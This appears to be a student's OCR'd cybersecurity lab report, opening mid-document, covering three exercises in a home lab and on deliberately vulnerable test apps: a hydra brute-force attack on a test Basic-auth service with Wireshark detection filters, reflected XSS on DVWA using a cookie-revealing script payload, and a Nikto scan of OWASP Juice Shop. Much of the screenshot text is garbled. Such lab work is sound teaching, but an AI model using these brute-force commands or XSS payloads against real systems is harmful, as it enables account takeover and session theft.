a<br>ie <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>Link/Loopback brd<br>inet /8 scope host lo<br>valid_lft forever preferred_lft forever<br>inet6 128 scope host noprefixroute<br>valid_lft forever preferred<br>2: <BROADCASTlft forever<br>Link/ether , MULTICAST, UP,LOWER_UP>brd mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>inet 24 brd scope global dynamic noprefixroute ethd<br>valid_lft 1503sec preferred_lft 1503sec<br>inet6 64 scope Link noprefixroute<br>valid_lft forever preferred lft forever<br>3: <NO-CARRIER,<br>Link/ether BROADCAST brd,MULTICAST,UP> mtu 1500 qdisc noqueue state group default qlen 0<br>inet 16 brd scope global dockerd<br>valid_lft forever preferred<br>lft forever<br><!-- End of picture text -->



<!-- Start of picture text -->
a 2 10.242.199.181<br>PING 10.242.199.181 (10.242.199.181) 56(84) bytes of data.<br>64 bytes from 10.242.199.181: icmp_seq=1 ttl=128 time=0.574 ms<br>64 bytes from 10.242.199.181: icmp_seq=2 ttl=128 time=0.299 ms<br>— 10.242.199.181 ping statistics —<br>2 packets transmitted, 2 received, 0% packet loss, time 1020ms<br>rtt min/avg/max/mdev = 0.299/0.436/0.574/0.137 ms<br><!-- End of picture text -->

#### **2. Windows Host Setup** 

###### ● **Create Target Service (auth_service.py):** 

 **import base64 from http.server import HTTPServer, BaseHTTPRequestHandler class AuthHandler(BaseHTTPRequestHandler): def do_GET(self): hdr = self.headers.get('Authorization', '') if hdr.startswith('Basic '): try: if base64.b64decode(hdr[6:]).decode() == "admin:Secr3t!2026": self.send_response(200) self.end_headers() self.wfile.write(b"OK") return except Exception: pass self.send_response(401) self.send_header('WWW-Authenticate', 'Basic realm="Test"') self.end_headers()** 

**HTTPServer(('0.0.0.0', 8080), AuthHandler).serve_forever()** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Name Date modified Type Size<br>Today<br>B auth service 26-Oct-26 9:03 PM Python File 1 kB |<br><!-- End of picture text -->

   - **Run Target Service (PowerShell):** 

- **python auth_service.py** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Directory: C:\Users\suraj\Downloads\Auth Project<br>Mode LastWriteTime Length Name<br>== 26-Oct-26 9:03 PM 732 auto_service.py<br>PS C:\Users\suraj\Downloads\Auth Project> python .\auth_service.py<br>127.0.0.1 — -— [26/Oct/2026 21:04:27] "GET / HTTP/1.1" 401 -<br><!-- End of picture text -->



<!-- Start of picture text -->
€ 9 0 ban ae Ole<br><!-- End of picture text -->

- **Start Wireshark:** 

   - **Select the active virtual adapter (VMnet / vEthernet).** 

   - **Capture filter:** 



<!-- Start of picture text -->
4240g@ BBB eroBrFsmeeaacaaaes<br>r o--:<br>TOE A ©-000000000 71 : Tisvi-2_ Application Dat<br>2een, ees it 1000074008 1 A TeP e003 > 4343 (ac<br>Seen. oe3 1 0000350000 #1 i TiSv1.2_ Application Dat<br>Set Sidi st 000000009 #1 t TLSv1.2 Application Dat<br>Get. 9002 :11 0000112000 #1 i TeP e002 » Stat (ac<br>jeu. | stall 000079009 #1 i Top stat » 8002 (ac<br>Sect. | ateg it 000000000 #1 i T1Sv1.2 Application Dat<br>10st. 004 4 1000056000 #1 t Ter epee > 44as (ac<br>test. 004 4 000205000 #1 i TLSv1.2_ Application Dat<br>13 4.13. 22417 2:1 @.000000000 ::1 cid TCP 22117 + 8080 [S]<br>15 4.13. 8368 127.0.0.. @. 000000000 127.0.0.1 127.0.0.1 TCP 8368 + 8080 [S\<br>16 4.13. 8080 127.0.0_ @.000099000 127.0.0.1 127.0.0.1 TCP 8080 + 8368 [:<br>ie ain. 6368 27.0.0. 0.008253000 12710.8.1 i780. ire Ger / wrTe/a.a<br>194.13. 8060 127... 0.000027000 127.0.0.1 1270.0. TcP 8000 + 6368 [ac<br>21 ain, 8368 127.8.€. 0.000071000 127.0.8.1 7.0.0.1 TeP 8368 + 080 [ac<br>22 4.13. 8080 127.0.0. 0.000120000 127.0.0.1 7.0.0.1 rte HTTP/1.0 401 un<br>25 aia. 4368 27.0.6. 0.000048000 127/0.0.1 127.0.0.1 Te 0368» s000 [ac<br>24 4.13. 8368 127.0.0_ @.002732008 127.0.0.1 127.0.0.1 TCP 8368 + 8080 [|<br>Source Port: 8080 28 @@ 29)<br>[Stream index: 3]<br>[Next Sequence Number: 1 (relative sequence number)]<br><!-- End of picture text -->

 **tcp.port == 8080** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
A040 uBDB (eoosemm Occue<br><!-- End of picture text -->

#### **3. Kali Attack Execution** 

###### ● **Generate Wordlist & Attack:** 

 **printf "123456\npassword\nadmin123\nSecr3t!2026\n" > /tmp/pass.txt hydra -l admin -P /tmp/pass.txt -s 8080 <Windows_IP> http-get /** 





<!-- Start of picture text -->
e<br>-/wordlistxt - Mousepad<br>BRSeBCx 9d o aan<br>1123456<br>2 password<br>312345678<br>4 admin123<br>5 qwerty<br>6 letmein<br>7 welcome<br>8 login<br>9 pass123<br>10 administrator<br>11 root123<br>12 toor<br>13 guest<br>1412345<br>15 test<br>16 master<br>17 superadmin<br>18 PasswOrd<br>19 adming123<br>20 Secr3t!2026<br>21|<br><!-- End of picture text -->



<!-- Start of picture text -->
admin -P wordList.txt 9080 10.242.199.181 http-get/<br><!-- End of picture text -->



<!-- Start of picture text -->
t 127.0.0.1 - - [26/O0ct/2026 21:15:09] "GET /favicon.ico HTTP/1.1" 200 -<br><!-- End of picture text -->

#### **4. Wireshark Detection Filters** 

###### ● **Detect failed attempts (Spike in 401s):** 

 **http.response.code == 401** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
2040 =BBB ieoesem me oaaee<br><!-- End of picture text -->

● **Detect successful breach following brute-force:** 

- **http.response.code == 200 && http.request.uri == "/"** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
@040 mabe eres em agkee<br><!-- End of picture text -->

● **Extract attempted credentials:** 

 **http.authorization** 

 

# **Assignment No 07** 

**Name: Borude Yash Ambadas PRN No: UCS23M1020** 

**Roll No: 20 Class: B.Tech Computer (A)** 

**Subject: Cryptography and Cyber Security** 

### **Perform Web Application Security Assessment: XSS Vulnerability Analysis** 

**1. Start Kali Linux VM and Metasploitable VM** 



<!-- Start of picture text -->
» Starting deferred execution scheduler atd (0K)<br>* Starting periodic connand scheduler crond (OK<br>* Starting Toncat servlet engine tomcatS.5 {Ox 1<br>* Starting web server apache [0K<br>» Running local boot scripts (vete/rc. local)<br>nohup: appending output to ‘nohup.out<br>nohup: appending output to ‘nohup.out<br>[0K 1<br>pbrane ca ror Corrircss i<br>Warning: Never expose this UM to an untrusted netuorkt<br>ontact: nsfdeulat Inctasploit.con<br>Login with msfadminsmsfadmin to get started<br>netasploitable login<br><!-- End of picture text -->



<!-- Start of picture text -->
BSieae vt 1 AG) AE<br>MAT A<br>tatletat-<br>Session Actions Edit View Help<br>itehl thd|<br><!-- End of picture text -->

**2. Check IP Address** 

**Metasploitable2** 



<!-- Start of picture text -->
nsradninenctasprortadie’ 9<br>eth Link encap: EthernetITcontHWaddrty 60: 06c 3:90:33:1a4<br>inet addr:10.24 199.18 Beast:10.242.199.255 Nask:255.255.255 .€<br>inet6 addr 2409: 40c2:8414: b3eb:20c:29ff :fe90:331a764 Scope:Global<br>inet6 addr: fe80::20c:29ff :f¢90:331a/64 Scope:Link<br>UP BROADCAST RUNNING MULTICAST NTU:1500 Metric:1<br>RX packets:66 errors:0 dropped:0 overruns:0 frane:0<br>TX packets:82 errors:0 dropped:@ overruns:@ carrier:@<br>collisions:0 txqueuelen:1000<br>RX bytes:7049 (6.8 KB) TX byte 1841 (8.6 KB)<br>Interrupt:1? Base addre 0x2000<br>lo Link encap:Local Loopback<br>inet addr:127.0.0.1 Mask:255.0.0.0<br>inet6 add 1/128 Scope:Host<br>UP LOOPBACK RUNNING NTU:16436 Metric:4<br>RX packets:96 errors:@ dropped:0 overruns:0 frane:0<br>TX packets:96 errors:0 dropped:@ overruns:@ carrier:0<br>collisions:0 txqueuelen:0<br>RX bytes 1437 (20.9 KB) TX byte 1437 (260.9 KB)<br>nsfadnin@metasploitable:~$ _<br><!-- End of picture text -->

###### **Kali Linux** 



<!-- Start of picture text -->
CS ipa -[~]<br>1: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>Link/lLoopback 00 00:00 brd 00:00 J<br>inet /8 scope host lo<br>valid_lft forever preferred_lft forever<br>inet6 /128 scope host noprefixroute<br>valid_lft forever preferred_1ft forever<br>2: et <BROADCAST<br>link/ether ,MULTICAST,2 UP, brdLOWER_UP> mtuf 1500 qdisc fq_codel state UP group default qlen 1000<br>inet /24 brd scope global dynamic noprefixroute eth®<br>valid_lft 3575sec preferred_lft 3575sec<br>inet6 /64 scope global dynamic noprefixroute<br>valid_lft 7177sec preferred_lft 7177sec<br>inet6 /64 scope link noprefixroute<br>valid_lft forever preferred_lft forever<br>3s r@: <NO-CARRIER,<br>link/ether 1d BROADCAST brd,MULTICAST,UP> mtu 1500f qdisc noqueue state group default qlen<br>inet /16 brd scope global dockerd<br>valid_lft forever preferred_lft forever<br><!-- End of picture text -->

###### **3. Ping Metasploitable machine to check both machines are in same network** 



<!-- Start of picture text -->
r—( ~]<br>|<br>—$ ping -c 5 10.242.199.18<br>PING 10.242.199.18 (10.242.199.18) 56(84) bytes of data.<br>64 bytes from 10.242.199.18: icmp_seq=1 ttl=64 time=0.321 ms<br>64 bytes from 10.242.199.18: icmp_seq=2 ttl=64 time=1.31 ms<br>64 bytes from 10.242.199.18: icmp_seq=3 ttl=64 time=0.660 ms<br>64 bytes from 10.242.199.18: icmp_seq=4 ttl=64 time=0.704 ms<br>64 bytes from 10.242.199.18: icmp_seq=5 ttl=64 time=0.228 ms<br>— 10.242.199.18 ping statistics —<br>5 packets transmitted, 5 received, 0% packet loss, time 4055ms<br>rtt min/avg/max/mdev = @.228/0.644/1.309/0.380 ms<br><!-- End of picture text -->

**a. We can access the machine because the ping was successful.** 

###### **4. Access the DVWA Lab at: http://<Metasploitable-IP>/dvwa/login.php** 



<!-- Start of picture text -->
ry)<br>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application thats damn vainerable. Its main goals are<br>Seaietonal Welcome to Damn Vulnerable Web App!<br>‘Setup better understand the processes of securing web applications and aid teachers/students to teach/leam web<br>Brute Force WARNING!<br>een Eee Damn Vulnerable Web App is damn vulnerable! Do not upload it to your hosting provider's public html folder or<br>csRF any internet facing web server as wl be compromised. We recommend dovmloading and instaling<br>File‘SQL i I n clusject ion ‘ontoDisclaimerRo  alocalalocal machine inside your LAN which is Used solely for testing<br>‘SQL Injection (Blind) We do not take responsibilty forthe way in which any one uses this application. We have made the purposes of<br>Upload prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation<br>XSS stored General Instructions<br>DVWA Security page.<br>PHP Info<br>About<br>Logout<br>I<br>$$$ PHPSecurity Leve IDS is l ehigh<br><!-- End of picture text -->

**5. Click on XSS Reflected** 



<!-- Start of picture text -->
DyWA)<br>Home Vulnerability: Reflected Cross Site Scripting (XSS)<br>Instructions TTT<br>= What's your name?<br>Brute Force eeSubmit) |<br>jo IS More info<br>‘(CSRF<br>File Inclusion<br>‘SQL Injection<br>‘SQL Injection (Blind)<br>Upload<br>XSS stored<br>DVWA Security<br>PHP Into<br>‘About<br>Logout<br>Username:Security Level: adminow ESView Source | View Help<br><!-- End of picture text -->



<!-- Start of picture text -->
6. Enter text into the input field and observe the output.<br><!-- End of picture text -->



<!-- Start of picture text -->
Vulnerability: Reflected Cross Site Scripting (XSS)<br>What's your name?<br>Suraj Submit<br>Hello Suraj<br><!-- End of picture text -->

###### **a. We can see that the entered input is reflected and visible on the screen. 7. Inspect the page source code to check where the input is reflected.** 



<!-- Start of picture text -->
CRO inspector ©) Oo N 0} q 0 8 t<br>wc<br>= nT = = = = =<br><!-- End of picture text -->

**a. This shows that the entered text is reflected inside a <pre> tag.** 

**b. Next, we will attempt to break out of the reflecting HTML context.** 

   **8. Attempt to close the open tag and escape the context.** 

- **</pre>Suraj** 



<!-- Start of picture text -->
What's your name?<br>Submit<br>Hello<br>Suraj<br><!-- End of picture text -->

- **The word "Suraj" has successfully rendered outside the <pre> tag.** 



<!-- Start of picture text -->
v<div class="vulnerable code area"><br>pre>Hel<br>di<br>2>More infec 2<br><!-- End of picture text -->

   **9. Now enter the XSS payload.** 

- **</pre><script>prompt(document.cookie)</script>** 



<!-- Start of picture text -->
‘OQ Not Secure 10.242.199.18<br>©|10.242.199.18<br><!-- End of picture text -->

**This will trigger a prompt displaying the session ID.** 



<!-- Start of picture text -->
hl>t)</hl<br>pre=Hello</pre<br>prompt (document. cookie)<br>i22More infoe/h2<br>ul>@</ul<br><!-- End of picture text -->

# Assignment No. 08 

**Name:** Borude Yash Ambadas **PRN No:** UCS23M1020 **Roll No:** 20 **Class:** B.Tech Computer (A) 

**Subject:** Cryptography and Cyber Security 

### **Analyze API and Application Security Weaknesses: Automated Vulnerability Scanning of Web Application** 



<!-- Start of picture text -->
1. Start Kali Linux.<br><!-- End of picture text -->



<!-- Start of picture text -->
HUM) UDEV UA<br>_<br>Session Actions Edit View Help<br>c : vite<br>HAL ft tH it ‘ne<br>hub rid Hei<br>MAAR Linney<br><!-- End of picture text -->

2. Update and upgrade the system: 

>  sudo apt update && sudo apt upgrade -y 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
( Jaled<br>“-¢§ sudo apt update sudo upgrade<br>Hit:1 http://dl.google.com/linux/chrome/deb stable InRelease<br>Hit:2 https://packages.microsoft.com/repos/code stable InRelease<br>Hit:3 https: //downloads.claude.ai/claude-desktop/apt/stable stable InRelease<br>Hit:4 http://http.kali.org/kali kali-rolling InRelease<br>Hit:5 https: //artifacts.elastic.co/packages/7.x/apt stable InRelease<br>Hit:6 https: //us-centrali-apt.pkg.dev/projects/antigravity-auto-updater-dev antigravity-debian InRelease<br>Beading package lists... 48%<br><!-- End of picture text -->



<!-- Start of picture text -->
r—( ~]<br>|LW ido apt install: nikto'<br>nikto is already the newest version (1:2.6.1-Qkali1)<br>Summary:<br>Upgrading: 0, Installing: @, Removing: @, Not Upgrading: 52<br><!-- End of picture text -->



<!-- Start of picture text -->
L i<br>Nikto v2.6.1<br>+ ERROR: No host (-host) specified<br>options:<br>Add-header Add HTTP headers (can be used multiple times, one per header pair)<br>ask+ Whether to ask about submitting updates<br>yes Ask about each (default)<br>no Don't ask, don't send<br>auto Don't ask, just send<br>check6 Check if IPv6 is working (connects to ipv6.google.com or value set in nikto.conf)<br>~Cgidirs+ Scan these CGI dirs: "none", “all", or values like "/cgi/ /cgi-a/"<br>config+ Use this config file<br>-Display+ Turn on/off display outputs:<br>1 Show redirects<br>a Show cookies received<br>3 Show all 200/0K responses<br>4 Show URLs which require authentication<br>D Debug output<br>E Display all HTTP errors<br>P Print progress to STDOUT<br>Ss Scrub output of IPs and hostnames<br>Vv Verbose output<br>-dbcheck Check database and other key files for syntax errors<br>evasion+ Encoding technique:<br>1 Random URI encoding (non-UTF8)<br>2 Directory self-reference (/./)<br>3 Premature URL ending<br>4 Prepend long random string<br>5 Fake parameter<br>6 Bac requcct cpace<br><!-- End of picture text -->

3. Install Nikto and check its availability. 

Visit OWASP Juice Shop: <u>https://juice-shop.herokuapp.com/#/</u> 



<!-- Start of picture text -->
é<br>ry = CT)| ae CT)poly) lTala<br><!-- End of picture text -->

4. Perform a scan on the target URL. Execute the Nikto scan against the target URL: 

- nikto -h https://juice-shop.herokuapp.com/#/search 



<!-- Start of picture text -->
<br><!-- End of picture text -->





###### 5. Analyze the results. 



<!-- Start of picture text -->
WHSec alLnar @Kalools<br>+ Kallacs KaiForms —NaliNtHunter  faplot-08 » Google Hacking DB<br>| “It!<br>peap.pntuk su<br><!-- End of picture text -->

- 

- 

- One of the results shows _/ftp/_ , which reveals the public FTP directory listing when visited. 

- Exposes sensitive files such as _coupons_2013.md.bak_ , _package.json.bak_ , and _incidentsupport.kdbx_ . 

- Identifies missing key security headers, including Content-Security-Policy (CSP), StrictTransport-Security (HSTS), and Permissions-Policy. 

- Detects hidden administrative and development paths via _robots.txt_ entry listings (e.g., _/ftp/_ ). 

